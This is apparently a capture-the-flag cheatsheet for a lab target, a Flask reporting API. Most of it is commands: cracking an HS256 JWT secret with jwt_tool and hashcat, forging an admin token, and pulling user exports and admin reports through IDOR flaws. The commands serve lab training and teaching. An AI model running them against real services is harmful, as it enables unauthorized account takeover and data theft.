# Cheatsheet — Signed & Confused

## Targets

- **jwt01** — flask reporting api on :80

## Useful commands

```bash
curl -s http://<ip>/ | jq                              # endpoint map + demo creds
curl -s -X POST http://<ip>/api/login \
  -H 'content-type: application/json' \
  -d '{"username":"<u>","password":"<p>"}' | jq -r .token

jwt_tool <token>                                       # inspect claims
jwt_tool <token> -C -d <wordlist>                      # crack HS256
hashcat -m 16500 -a 0 <token> <wordlist>
jwt_tool <token> -I -pc admin -pv true -S hs256 -k <secret>

curl -s http://<ip>/api/users/<id>/export -H "Authorization: Bearer $T" | jq
curl -s http://<ip>/api/admin/report -H "Authorization: Bearer $T" | jq
```

## Concepts

- HS256 = symmetric — whoever knows the secret mints anything
- IDOR/BOLA: authorization checked on the *session*, not the *object*
- `alg:none` rarely works against real libs — crack the secret instead
